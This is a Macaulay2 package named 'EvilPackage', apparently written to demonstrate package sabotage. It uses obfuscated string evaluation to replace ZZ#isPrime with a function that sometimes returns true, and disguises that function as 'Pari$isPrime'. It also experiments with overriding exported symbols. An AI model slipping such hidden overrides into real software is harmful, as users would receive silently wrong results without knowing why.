newPackage(
     "EvilPackage",
     Version => "0.1", 
     Date => "14.02.2017",
     Authors => {{
           Name => "Jakob Kroeker", 
           Email => "jakobkroeker.academic@spaceship-earth.net" 
      }},
     Configuration => {},  
     Headline => "Evil package"
)
-- restart 
CompiliedFunction = new Type of  FunctionClosure;

originalIsPrime = ZZ#isPrime

f = (n)->(
    --return true;
    -- or only do that once in 100 cases
    if (random(10)==4) then
    (
        return true;
    )
    else
    (
        return originalIsPrime n;
    );
);

 
net (CompiliedFunction) := Net =>(bb)->
(
    L := {"Pari$isPrime"};
        return stack L;
);

g = new CompiliedFunction from f;



EvilIsPrimeString =  "(" | "num" | ")" | "-" | ">" |"t" | "r" | "u" | "e" ;


obfuscatedEvilCommand =  "Z" | "Z" | "#" | "i" | "s" | "P" | "r" | "i" | "m" | "e" | "=" | EvilIsPrimeString
obfuscatedEvilCommand =  "Z" | "Z" | "#" | "i" | "s" | "P" | "r" | "i" | "m" | "e" | "= g" 

-- only do that once in 100 cases
value obfuscatedEvilCommand;
if (random(100)==40) then value obfuscatedEvilCommand;
-- or do that once in 100 cases and in 10 cases revert it 


export {   
    "trueFunction",
    "libraryMethod",
    "valuesAt"
};
    
 

    
trueFunction  =  () -> true;
    
--trueFunction = method();

--trueFunction (Thing) := Boolean => () -> true;



libraryMethod = method();

libraryMethod( Function ) := ZZ => (foo)->
(
    localTrueFunction := trueFunction;
    somethingUseful := foo(); -- but foo is evil.
    
    return localTrueFunction();
);

    

end
--------------------------------------

restart;

not isPrime 6

loadPackage "EvilPackage";

not isPrime 6

trueFunction
trueFunction()

foo2 = ()->
(
   bla2 := ()->false;
   export "bla2";
);


foo = ()->
(
    User$trueFunction = bla;
    print ("here 1");
    trueFunction := getGlobalSymbol(User#"private dictionary", "trueFunction");
    --value localTrueFunction;
    trueFunction = ()-> false;  
    print ("here 2");
     trueFunction = getGlobalSymbol(User.Dictionary, "trueFunction");
    --value localTrueFunction;
    trueFunction = ()-> false;  
    trueFunction = getGlobalSymbol(EvilAccident#"private dictionary", "trueFunction");
    trueFunction = ()-> false;     
    return 10;
)

libraryMethod(foo)

trueFunction
trueFunction()

trueFunction();


